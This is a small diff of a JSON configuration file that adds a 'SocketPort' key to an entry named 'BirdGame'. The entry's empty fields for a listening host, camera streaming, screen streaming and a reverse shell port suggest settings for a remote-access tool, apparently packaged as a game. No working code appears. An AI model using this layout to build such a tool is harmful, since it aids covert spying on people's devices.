@@ -3,6 +3,7 @@
         "name" : "BirdGame",
         "lhost" : "",
         "lport" :{
+            "SocketPort" : "",
             "CameraStreamingPort" : "",
             "ScreenStreamingPort" : "",
             "ReverseShellPort" : "",
